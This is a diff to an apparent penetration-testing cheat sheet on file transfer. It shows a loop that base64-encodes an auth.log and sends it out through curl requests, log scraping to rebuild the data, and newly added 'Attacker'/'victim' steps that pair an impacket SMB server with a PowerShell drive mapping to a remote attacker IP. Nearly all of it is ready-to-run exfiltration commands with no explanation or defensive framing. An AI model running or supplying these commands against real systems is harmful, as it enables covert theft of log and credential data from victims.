@@ -21,3 +21,11 @@ for i in $(cat /labs/1.3/auth.log |base64); do curl http://127.0.0.1:8080/$i; do
 cat test.log |grep -Eo '[A-Za-z0-9\+\/\=]{40,100}' |sed 's/\///g' >file.txt
 #Receiver:
 cat file.txt |base64 -d >file.txt.decoded
+
+#PowerShell/SMB Share File Transfer
+#Attacker:
+impacket-smbserver SomeShare `pwd`
+#victim:
+New-PSDrive -Name "LocalNameOfSomeSort" -PSProvider "Filesystem" -Root "\\REM.OTE.IP.ADDR\\SomeShare"
+#victim:
+cd LocalNameOfSomeSort:
